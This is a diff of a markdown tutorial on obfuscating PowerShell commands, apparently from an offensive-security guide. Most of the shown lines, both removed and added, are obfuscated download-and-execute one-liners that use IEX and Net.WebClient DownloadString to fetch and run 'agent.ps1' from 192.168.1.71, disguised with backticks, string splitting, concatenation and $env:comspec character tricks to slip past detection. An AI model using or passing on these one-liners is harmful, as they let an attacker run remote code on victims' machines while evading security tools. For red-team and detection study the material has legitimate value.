@@ -111,31 +111,31 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
 - String obfuscated<br />
 
-      $get="New-Ob'+'je'+'ct N'+'etW'+'ebCl'+'ient"
-      p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
-
-- Using **powershell special caracters: '** and **+**
-
-      power'+'shell IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//192.16'+'8.1.71/agent.ps1')
+      $get="N`et.Web`Cli`ent"
+      powershell.exe I`EX (New-Object $get).D`ow`nloa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
 
 - Using an **batch** local variable inside the **powershell interpreter**
 
       cmd.exe /c "set var=Get-Date && cmd.exe /c echo %var%^" | powershell.exe
 
-      c`m`d.e`xe /c "s^et va^r=Get-Date && c^md^.e^xe /c e^ch^o %var%^" | power`shel`l.e`x`e
-
 ![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)
 
-- Using **$env:comspec** (windows environment variable) and **-Join''** to pull out the 4º,15º and 25º characters
-from $env:comspec variable and uses the **-Join''** operator to take the arraw and convert it to a string.
+      c`m`d.e`xe /c "s^Et va^r=Get-Date && c^md^.e^xe /c e^ch^o %var%^" | power`shel`l.e`x`e
 
-      $env:comspec[4,15,25]-Join'' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
+![powershell obfuscation](http://i.cubeupload.com/G6rj4M.jpg)
 
-![powershell obfuscation](http://i.cubeupload.com/Um9qJu.jpg)
+- Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º,15º and 25º characters
+from $env:comspec variable and uses the **-Join ''** operator to take the arraw and convert it to a string.
 
-- Using an powershell variable (**$cmdWithDelim**) to **split** the system call and then **-Join** it back again
+      $env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
+
+![powershell obfuscation](http://i.cubeupload.com/CIbrFI.jpg)
+
+- Using an powershell variable (**$cmdWithDelim**) to **split** the system call and then **-Join ''** it back again
 
       $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
+
+![powershell obfuscation](http://i.cubeupload.com/wAZr7K.jpg)
 
 ---
 
